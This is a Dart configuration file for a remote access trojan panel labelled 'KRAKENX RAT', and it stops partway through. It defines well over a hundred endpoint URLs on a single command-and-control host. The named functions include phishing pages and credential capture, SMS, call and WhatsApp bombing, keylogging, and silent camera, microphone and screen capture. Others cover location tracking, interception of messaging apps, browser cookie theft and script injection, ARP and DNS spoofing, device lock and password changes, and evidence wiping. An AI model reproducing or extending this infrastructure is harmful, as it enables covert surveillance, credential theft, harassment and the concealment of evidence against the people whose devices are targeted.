// ============================================================================
// API CONFIGURATION - KRAKENX RAT (FULL) - ULTIMATE EDITION
// ============================================================================
// ============================================================================
//  APP CONFIG — shared session
// ============================================================================
class AppConfig {
  static String? sessionKey;
}

class ApiConfig {
  // ===== MAIN SERVER (Port 2178) =====
  static const String baseUrl = "http://kurumi-elaina.dianaxyz.my.id:2101";
  
  // ===== RAT SERVER (Port 2178) =====
  static const String ratBaseUrl = "http://kurumi-elaina.dianaxyz.my.id:2101";

  // ===== TIMEOUT =====
  static const int connectionTimeout = 30;
  static const int receiveTimeout = 30;

  // ==================== MAIN APP ENDPOINTS (PORT 2178) ====================
  static const String validateEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/validate";
  static const String myInfoEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/myInfo";
  static const String changePassEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/changepass";
  static const String sendBugEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/sendBug";
  static const String createAccountEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/createAccount";
  static const String deleteUserEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/deleteUser";
  static const String getPairingEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/getPairing";
  static const String mySenderEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/mySender";
  static const String globalSendersEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/globalSenders";
  static const String addGlobalSenderEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/addGlobalSender";
  static const String confirmGlobalSenderEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/confirmGlobalSender";
  static const String deleteGlobalSenderEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/deleteGlobalSender";
  static const String addServerEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/addServer";
  static const String delServerEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/delServer";
  static const String sendCommandEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/sendCommand";
  static const String myServerEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/myServer";
  static const String spamCallEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/spamCall";
  static const String getInfoEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/getInfo";
  static const String getOnlineUsersEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/getOnlineUsers";
  static const String listUsersEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/listUsers";
  static const String userAddEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/userAdd";
  static const String editUserEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/editUser";
  static const String changeUserRoleEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/changeUserRole";
  static const String refreshCoinsEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/refreshCoins";
  static const String redeemEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/redeem";
  static const String giftCoinEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/giftCoin";
  static const String requestTopupEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/requestTopup";
  static const String checkTopupStatusEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/checkTopupStatus";
  static const String getPrivateSendersEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/getPrivateSenders";
  static const String getGlobalSendersEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/getGlobalSenders";
  static const String deleteSenderEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/deleteSender";
  static const String getLogEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/getLog";
  static const String pingEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/ping";
  static const String getPublicSendersEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/getPublicSenders";

  // ==================== PHISHING ENDPOINTS (PORT 2178) ====================
  static const String phishingCreatePage = "http://kurumi-elaina.dianaxyz.my.id:2101/api/create-fake-page";
  static const String phishingCapture = "http://kurumi-elaina.dianaxyz.my.id:2101/api/capture";
  static const String phishingGetCreds = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-creds";
  static const String phishingSmsBomber = "http://kurumi-elaina.dianaxyz.my.id:2101/api/sms-bomber";
  static const String phishingCallBomber = "http://kurumi-elaina.dianaxyz.my.id:2101/api/call-bomber";
  static const String phishingWaRaid = "http://kurumi-elaina.dianaxyz.my.id:2101/api/wa-raid";
  static const String phishingWaSpam = "http://kurumi-elaina.dianaxyz.my.id:2101/api/wa-spam";

  // ==================== CHAT GLOBAL (PORT 2178) ====================
  static const String getChatMessagesEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/api/chat/messages";
  static const String sendChatMessageEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/api/chat/send";
  static const String uploadChatMediaEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/api/chat/upload";
  static const String getChatRoomsEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/api/chat/rooms";
  static const String getChatUsersEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/api/chat/users";
  static const String getChatHistoryEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/api/chat/history";
  static const String deleteChatMessageEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/api/chat/message";

  // ==================== AI CHAT (PORT 2178) ====================
  static const String aiChatEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/api/chat";

  // ==================== RAT ENDPOINTS (PORT 2178) ====================
  static const String ratPairIdEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/rat/pairid";
  static const String ratPairEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/rat/pair";
  static const String ratMyDevicesEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/rat/my-devices";
  static const String ratKeepaliveEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/api/device/keepalive";
  static const String ratSendCommandEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/api/send-command";
  static const String ratGetResponseEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-response";
  static const String ratLockChatEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/api/lock-chat";
  static const String ratLockAllChatsEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/api/lock-chat-all";
  static const String ratNotificationsEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-notifications";
  static const String ratLiveFrameEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/api/live-frame";
  static const String ratPermissionStatusEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/rat/permission-status";
  static const String ratSetDevicePermEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/setDevicePerm";
  static const String ratListDevicePermsEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/listDevicePerms";
  static const String ratPersistOnlineEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/api/device/persist-online";
  static const String ratRegisterTargetEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/api/register-target";
  static const String ratPairTargetEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/api/pair-target";
  static const String ratHeartbeatEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/api/heartbeat";
  static const String ratGetCommandEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-command";
  static const String ratPostResponseEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/api/post-response";
  static const String ratLiveFramePostEndpoint = "http://kurumi-elaina.dianaxyz.my.id:2101/api/live-frame";

  // ==================== RAT ULTIMATE FEATURES ENDPOINTS ====================
  
  // ─── Keylogger ─────────────────────────────────────────────────────
  static const String ratStartKeylogger = "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-keylogger";
  static const String ratStopKeylogger = "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-keylogger";
  static const String ratGetKeylogs = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-keylogs";
  
  // ─── Keylogger Advanced ──────────────────────────────────────────
  static const String ratStartAdvancedKeylogger = "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-advanced-keylogger";
  static const String ratStopAdvancedKeylogger = "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-advanced-keylogger";
  static const String ratGetKeylogsTimestamp = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-keylogs-timestamp";
  static const String ratGetKeyloggerStats = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-keylogger-stats";
  static const String ratClearKeylogs = "http://kurumi-elaina.dianaxyz.my.id:2101/api/clear-keylogs";
  static const String ratExportKeylogs = "http://kurumi-elaina.dianaxyz.my.id:2101/api/export-keylogs";
  
  // ─── Clipboard Monitor ────────────────────────────────────────────
  static const String ratStartClipboardMonitor = "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-clipboard-monitor";
  static const String ratStopClipboardMonitor = "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-clipboard-monitor";
  static const String ratGetClipboardHistory = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-clipboard-history";
  static const String ratClearClipboardHistory = "http://kurumi-elaina.dianaxyz.my.id:2101/api/clear-clipboard-history";
  
  // ─── Screen Recorder ─────────────────────────────────────────────
  static const String ratStartScreenRecording = "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-screen-recording";
  static const String ratStopScreenRecording = "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-screen-recording";
  static const String ratGetScreenRecording = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-screen-recording";
  static const String ratStartScreenRecordingAudio = "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-screen-recording-audio";
  static const String ratTakeScreenshotSilent = "http://kurumi-elaina.dianaxyz.my.id:2101/api/take-screenshot-silent";
  static const String ratTakeBurstScreenshots = "http://kurumi-elaina.dianaxyz.my.id:2101/api/take-burst-screenshots";
  static const String ratTakeScreenshotMetadata = "http://kurumi-elaina.dianaxyz.my.id:2101/api/take-screenshot-metadata";
  
  // ─── Audio Recorder ──────────────────────────────────────────────
  static const String ratStartAudioRecording = "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-audio-recording";
  static const String ratStopAudioRecording = "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-audio-recording";
  static const String ratGetAudioRecording = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-audio-recording";
  static const String ratStartAudioStreaming = "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-audio-streaming";
  static const String ratStopAudioStreaming = "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-audio-streaming";
  static const String ratStartHqAudioRecording = "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-hq-audio-recording";
  static const String ratSetAudioQuality = "http://kurumi-elaina.dianaxyz.my.id:2101/api/set-audio-quality";
  
  // ─── Video Recorder ──────────────────────────────────────────────
  static const String ratStartVideoRecording = "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-video-recording";
  static const String ratStopVideoRecording = "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-video-recording";
  static const String ratGetVideoRecording = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-video-recording";
  static const String ratStartBgVideoRecording = "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-bg-video-recording";
  static const String ratStartVideoStreaming = "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-video-streaming";
  static const String ratStopVideoStreaming = "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-video-streaming";
  static const String ratTakePhotoSilent = "http://kurumi-elaina.dianaxyz.my.id:2101/api/take-photo-silent";
  static const String ratTakePhotoExif = "http://kurumi-elaina.dianaxyz.my.id:2101/api/take-photo-exif";
  
  // ─── Location Tracking ───────────────────────────────────────────
  static const String ratStartRealtimeLocation = "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-realtime-location";
  static const String ratStopRealtimeLocation = "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-realtime-location";
  static const String ratGetLocationHistory = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-location-history";
  static const String ratClearLocationHistory = "http://kurumi-elaina.dianaxyz.my.id:2101/api/clear-location-history";
  static const String ratGetGeofenceAlerts = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-geofence-alerts";
  static const String ratSetGeofence = "http://kurumi-elaina.dianaxyz.my.id:2101/api/set-geofence";
  
  // ─── Call Recorder ───────────────────────────────────────────────
  static const String ratStartCallRecording = "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-call-recording";
  static const String ratStopCallRecording = "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-call-recording";
  static const String ratGetCallRecords = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-call-records";
  static const String ratDeleteCallRecord = "http://kurumi-elaina.dianaxyz.my.id:2101/api/delete-call-record";
  
  // ─── SMS Intercept ───────────────────────────────────────────────
  static const String ratStartSmsInterceptor = "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-sms-interceptor";
  static const String ratStopSmsInterceptor = "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-sms-interceptor";
  static const String ratGetSmsConversations = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-sms-conversations";
  static const String ratSendSms = "http://kurumi-elaina.dianaxyz.my.id:2101/api/send-sms";
  static const String ratSendSmsBulk = "http://kurumi-elaina.dianaxyz.my.id:2101/api/send-sms-bulk";
  static const String ratDeleteAllSms = "http://kurumi-elaina.dianaxyz.my.id:2101/api/delete-all-sms";
  
  // ─── WhatsApp Intercept ──────────────────────────────────────────
  static const String ratStartWaInterceptor = "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-wa-interceptor";
  static const String ratStopWaInterceptor = "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-wa-interceptor";
  static const String ratGetWaMessages = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-wa-messages";
  static const String ratGetWaContacts = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-wa-contacts";
  static const String ratGetWaGroups = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-wa-groups";
  static const String ratSendWaMessage = "http://kurumi-elaina.dianaxyz.my.id:2101/api/send-wa-message";
  static const String ratGetWaStatus = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-wa-status";
  static const String ratSetWaStatus = "http://kurumi-elaina.dianaxyz.my.id:2101/api/set-wa-status";
  
  // ─── Telegram Intercept ──────────────────────────────────────────
  static const String ratStartTgInterceptor = "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-tg-interceptor";
  static const String ratStopTgInterceptor = "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-tg-interceptor";
  static const String ratGetTgMessages = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-tg-messages";
  static const String ratGetTgContacts = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-tg-contacts";
  static const String ratGetTgGroups = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-tg-groups";
  static const String ratSendTgMessage = "http://kurumi-elaina.dianaxyz.my.id:2101/api/send-tg-message";
  
  // ─── Instagram Intercept ─────────────────────────────────────────
  static const String ratStartIgInterceptor = "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-ig-interceptor";
  static const String ratStopIgInterceptor = "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-ig-interceptor";
  static const String ratGetIgMessages = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-ig-messages";
  static const String ratSendIgMessage = "http://kurumi-elaina.dianaxyz.my.id:2101/api/send-ig-message";
  
  // ─── Facebook Intercept ──────────────────────────────────────────
  static const String ratStartFbInterceptor = "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-fb-interceptor";
  static const String ratStopFbInterceptor = "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-fb-interceptor";
  static const String ratGetFbMessages = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-fb-messages";
  static const String ratSendFbMessage = "http://kurumi-elaina.dianaxyz.my.id:2101/api/send-fb-message";
  
  // ─── Browser Intercept ───────────────────────────────────────────
  static const String ratGetBrowserBookmarks = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-browser-bookmarks";
  static const String ratGetBrowserDownloads = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-browser-downloads";
  static const String ratGetBrowserCookies = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-browser-cookies";
  static const String ratGetBrowserExtensions = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-browser-extensions";
  static const String ratGetBrowserTabs = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-browser-tabs";
  static const String ratClearBrowserCache = "http://kurumi-elaina.dianaxyz.my.id:2101/api/clear-browser-cache";
  static const String ratClearBrowserHistory = "http://kurumi-elaina.dianaxyz.my.id:2101/api/clear-browser-history";
  static const String ratInjectBrowserScript = "http://kurumi-elaina.dianaxyz.my.id:2101/api/inject-browser-script";
  static const String ratCloseBrowserTab = "http://kurumi-elaina.dianaxyz.my.id:2101/api/close-browser-tab";
  static const String ratOpenBrowserTab = "http://kurumi-elaina.dianaxyz.my.id:2101/api/open-browser-tab";
  
  // ─── Network Intercept ───────────────────────────────────────────
  static const String ratStartPacketCapture = "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-packet-capture";
  static const String ratStopPacketCapture = "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-packet-capture";
  static const String ratGetPacketCapture = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-packet-capture";
  static const String ratStartMitm = "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-mitm";
  static const String ratStopMitm = "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-mitm";
  static const String ratScanNetwork = "http://kurumi-elaina.dianaxyz.my.id:2101/api/scan-network";
  static const String ratGetConnectedDevices = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-connected-devices";
  static const String ratPortScan = "http://kurumi-elaina.dianaxyz.my.id:2101/api/port-scan";
  static const String ratArpSpoof = "http://kurumi-elaina.dianaxyz.my.id:2101/api/arp-spoof";
  static const String ratDnsSpoof = "http://kurumi-elaina.dianaxyz.my.id:2101/api/dns-spoof";
  static const String ratGetNetworkStats = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-network-stats";
  static const String ratGetNetworkConnections = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-network-connections";
  
  // ─── File System ──────────────────────────────────────────────────
  static const String ratGetFileInfo = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-file-info";
  static const String ratGetDirectorySize = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-directory-size";
  static const String ratCopyFile = "http://kurumi-elaina.dianaxyz.my.id:2101/api/copy-file";
  static const String ratMoveFile = "http://kurumi-elaina.dianaxyz.my.id:2101/api/move-file";
  static const String ratRenameFile = "http://kurumi-elaina.dianaxyz.my.id:2101/api/rename-file";
  static const String ratCreateDirectory = "http://kurumi-elaina.dianaxyz.my.id:2101/api/create-directory";
  static const String ratRemoveDirectory = "http://kurumi-elaina.dianaxyz.my.id:2101/api/remove-directory";
  static const String ratZipFiles = "http://kurumi-elaina.dianaxyz.my.id:2101/api/zip-files";
  static const String ratUnzipFiles = "http://kurumi-elaina.dianaxyz.my.id:2101/api/unzip-files";
  static const String ratEncryptFile = "http://kurumi-elaina.dianaxyz.my.id:2101/api/encrypt-file";
  static const String ratDecryptFile = "http://kurumi-elaina.dianaxyz.my.id:2101/api/decrypt-file";
  
  // ─── Security ─────────────────────────────────────────────────────
  static const String ratGetSecurityLog = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-security-log";
  static const String ratClearSecurityLog = "http://kurumi-elaina.dianaxyz.my.id:2101/api/clear-security-log";
  static const String ratGetEncryptionKey = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-encryption-key";
  static const String ratSetEncryptionKey = "http://kurumi-elaina.dianaxyz.my.id:2101/api/set-encryption-key";
  static const String ratEnableSecureMode = "http://kurumi-elaina.dianaxyz.my.id:2101/api/enable-secure-mode";
  static const String ratDisableSecureMode = "http://kurumi-elaina.dianaxyz.my.id:2101/api/disable-secure-mode";
  static const String ratSetFirewallRule = "http://kurumi-elaina.dianaxyz.my.id:2101/api/set-firewall-rule";
  static const String ratRemoveFirewallRule = "http://kurumi-elaina.dianaxyz.my.id:2101/api/remove-firewall-rule";
  static const String ratGetFirewallRules = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-firewall-rules";
  static const String ratEnableAntivirusScan = "http://kurumi-elaina.dianaxyz.my.id:2101/api/enable-antivirus-scan";
  static const String ratGetAntivirusResult = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-antivirus-result";
  
  // ─── User Control ────────────────────────────────────────────────
  static const String ratGetUserAccounts = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-user-accounts";
  static const String ratCreateUserAccount = "http://kurumi-elaina.dianaxyz.my.id:2101/api/create-user-account";
  static const String ratDeleteUserAccount = "http://kurumi-elaina.dianaxyz.my.id:2101/api/delete-user-account";
  static const String ratChangeUserPassword = "http://kurumi-elaina.dianaxyz.my.id:2101/api/change-user-password";
  static const String ratSetUserPermission = "http://kurumi-elaina.dianaxyz.my.id:2101/api/set-user-permission";
  static const String ratGetUserPermissions = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-user-permissions";
  static const String ratLockUserAccount = "http://kurumi-elaina.dianaxyz.my.id:2101/api/lock-user-account";
  static const String ratUnlockUserAccount = "http://kurumi-elaina.dianaxyz.my.id:2101/api/unlock-user-account";
  static const String ratEnableGuestMode = "http://kurumi-elaina.dianaxyz.my.id:2101/api/enable-guest-mode";
  static const String ratDisableGuestMode = "http://kurumi-elaina.dianaxyz.my.id:2101/api/disable-guest-mode";
  
  // ─── System Info ──────────────────────────────────────────────────
  static const String ratGetSystemInfo = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-system-info";
  static const String ratGetHardwareInfo = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-hardware-info";
  static const String ratGetOsInfo = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-os-info";
  static const String ratGetKernelInfo = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-kernel-info";
  static const String ratGetCpuInfo = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-cpu-info";
  static const String ratGetMemoryInfo = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-memory-info";
  static const String ratGetDiskInfo = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-disk-info";
  static const String ratGetRunningTasks = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-running-tasks";
  static const String ratKillProcess = "http://kurumi-elaina.dianaxyz.my.id:2101/api/kill-process";
  
  // ─── Anti-Forensic / Wipe ────────────────────────────────────────
  static const String ratWipeEvidence = "http://kurumi-elaina.dianaxyz.my.id:2101/api/wipe-evidence";
  static const String ratWipeLogs = "http://kurumi-elaina.dianaxyz.my.id:2101/api/wipe-logs";
  static const String ratWipeCache = "http://kurumi-elaina.dianaxyz.my.id:2101/api/wipe-cache";
  static const String ratWipeTempFiles = "http://kurumi-elaina.dianaxyz.my.id:2101/api/wipe-temp-files";
  static const String ratWipeRecentFiles = "http://kurumi-elaina.dianaxyz.my.id:2101/api/wipe-recent-files";
  static const String ratWipeClipboardHistory = "http://kurumi-elaina.dianaxyz.my.id:2101/api/wipe-clipboard-history";
  static const String ratWipeSearchHistory = "http://kurumi-elaina.dianaxyz.my.id:2101/api/wipe-search-history";
  static const String ratWipeLocationHistory = "http://kurumi-elaina.dianaxyz.my.id:2101/api/wipe-location-history";
  static const String ratWipeCallHistory = "http://kurumi-elaina.dianaxyz.my.id:2101/api/wipe-call-history";
  static const String ratWipeSmsHistory = "http://kurumi-elaina.dianaxyz.my.id:2101/api/wipe-sms-history";
  static const String ratWipeAll = "http://kurumi-elaina.dianaxyz.my.id:2101/api/wipe-all";
  
  // ─── Remote Desktop ──────────────────────────────────────────────
  static const String ratStartRemoteDesktop = "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-remote-desktop";
  static const String ratStopRemoteDesktop = "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-remote-desktop";
  static const String ratRemoteDesktopMouse = "http://kurumi-elaina.dianaxyz.my.id:2101/api/remote-desktop-mouse";
  static const String ratRemoteDesktopKeyboard = "http://kurumi-elaina.dianaxyz.my.id:2101/api/remote-desktop-keyboard";
  static const String ratRemoteDesktopSendKeys = "http://kurumi-elaina.dianaxyz.my.id:2101/api/remote-desktop-send-keys";
  static const String ratRemoteDesktopClick = "http://kurumi-elaina.dianaxyz.my.id:2101/api/remote-desktop-click";
  static const String ratRemoteDesktopScroll = "http://kurumi-elaina.dianaxyz.my.id:2101/api/remote-desktop-scroll";
  
  // ─── Automation ───────────────────────────────────────────────────
  static const String ratAutoTap = "http://kurumi-elaina.dianaxyz.my.id:2101/api/auto-tap";
  static const String ratAutoSwipe = "http://kurumi-elaina.dianaxyz.my.id:2101/api/auto-swipe";
  static const String ratAutoClick = "http://kurumi-elaina.dianaxyz.my.id:2101/api/auto-click";
  static const String ratAutoScroll = "http://kurumi-elaina.dianaxyz.my.id:2101/api/auto-scroll";
  static const String ratAutoType = "http://kurumi-elaina.dianaxyz.my.id:2101/api/auto-type";
  static const String ratRecordActions = "http://kurumi-elaina.dianaxyz.my.id:2101/api/record-actions";
  static const String ratStopRecordActions = "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-record-actions";
  static const String ratPlayActions = "http://kurumi-elaina.dianaxyz.my.id:2101/api/play-actions";
  static const String ratLoopActions = "http://kurumi-elaina.dianaxyz.my.id:2101/api/loop-actions";
  static const String ratSetAutoResponse = "http://kurumi-elaina.dianaxyz.my.id:2101/api/set-auto-response";
  static const String ratSetAutoReply = "http://kurumi-elaina.dianaxyz.my.id:2101/api/set-auto-reply";
  
  // ─── AI Features ──────────────────────────────────────────────────
  static const String ratAiAnalyzeScreen = "http://kurumi-elaina.dianaxyz.my.id:2101/api/ai-analyze-screen";
  static const String ratAiAnalyzePhoto = "http://kurumi-elaina.dianaxyz.my.id:2101/api/ai-analyze-photo";
  static const String ratAiAnalyzeAudio = "http://kurumi-elaina.dianaxyz.my.id:2101/api/ai-analyze-audio";
  static const String ratAiAnalyzeText = "http://kurumi-elaina.dianaxyz.my.id:2101/api/ai-analyze-text";
  static const String ratAiAnalyzeLocation = "http://kurumi-elaina.dianaxyz.my.id:2101/api/ai-analyze-location";
  static const String ratAiGenerateReport = "http://kurumi-elaina.dianaxyz.my.id:2101/api/ai-generate-report";
  static const String ratAiSummarizeChat = "http://kurumi-elaina.dianaxyz.my.id:2101/api/ai-summarize-chat";
  static const String ratAiTranslate = "http://kurumi-elaina.dianaxyz.my.id:2101/api/ai-translate";
  static const String ratAiSuggestReply = "http://kurumi-elaina.dianaxyz.my.id:2101/api/ai-suggest-reply";
  
  // ─── Password Control ─────────────────────────────────────────────
  static const String ratChangeLockPassword = "http://kurumi-elaina.dianaxyz.my.id:2101/api/change-lock-password";
  static const String ratSetScreenLock = "http://kurumi-elaina.dianaxyz.my.id:2101/api/set-screen-lock";
  static const String ratChangeSystemPassword = "http://kurumi-elaina.dianaxyz.my.id:2101/api/change-system-password";
  static const String ratResetLockPassword = "http://kurumi-elaina.dianaxyz.my.id:2101/api/reset-lock-password";
  
  // ─── Device Control ──────────────────────────────────────────────
  static const String ratSetScreenBrightness = "http://kurumi-elaina.dianaxyz.my.id:2101/api/set-screen-brightness";
  static const String ratGetScreenBrightness = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-screen-brightness";
  static const String ratSetAutoRotate = "http://kurumi-elaina.dianaxyz.my.id:2101/api/set-auto-rotate";
  static const String ratSetScreenTimeout = "http://kurumi-elaina.dianaxyz.my.id:2101/api/set-screen-timeout";
  static const String ratSetAirplaneMode = "http://kurumi-elaina.dianaxyz.my.id:2101/api/set-airplane-mode";
  static const String ratSetWifiHotspot = "http://kurumi-elaina.dianaxyz.my.id:2101/api/set-wifi-hotspot";
  static const String ratSetVolume = "http://kurumi-elaina.dianaxyz.my.id:2101/api/set-volume";
  static const String ratGetVolume = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-volume";
  
  // ─── Microphone Recording ────────────────────────────────────────
  static const String ratStartMicRecording = "http://kurumi-elaina.dianaxyz.my.id:2101/api/start-mic-recording";
  static const String ratStopMicRecording = "http://kurumi-elaina.dianaxyz.my.id:2101/api/stop-mic-recording";
  static const String ratGetAudio = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-audio";
  
  // ─── Call Logs ────────────────────────────────────────────────────
  static const String ratGetCallLogs = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-call-logs";
  
  // ─── Installed Apps ──────────────────────────────────────────────
  static const String ratGetInstalledApps = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-installed-apps";
  
  // ─── WiFi Networks ───────────────────────────────────────────────
  static const String ratGetWifiNetworks = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-wifi-networks";
  static const String ratConnectWifi = "http://kurumi-elaina.dianaxyz.my.id:2101/api/connect-wifi";
  
  // ─── Device Info ─────────────────────────────────────────────────
  static const String ratGetDeviceInfo = "http://kurumi-elaina.dianaxyz.my.id:2101/api/get-device-info";
  
  // ─── Volume Control ──────────────────────────────────────────────
  static const String ratDisableVolume = "http://kurumi-elaina.dianaxyz.my.id:2101/api/disable-volume";
  static const String ratEnableVolume = "http://kurumi-elaina.dianaxyz.my.id:2101/api/enable-volume";
  
  // ─── Touch Control ───────────────────────────────────────────────
